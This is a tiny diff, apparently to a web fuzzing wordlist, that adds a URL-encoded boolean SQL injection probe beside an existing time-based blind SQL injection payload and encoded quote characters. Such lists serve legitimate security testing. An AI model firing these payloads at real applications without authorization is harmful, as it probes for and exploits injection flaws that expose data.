@@ -1,4 +1,5 @@
 if(now()=sysdate()%2Csleep(10)%2C0)
+8%20or%207250%3d0725
 &apos;
 &lsquo;
 &#39;
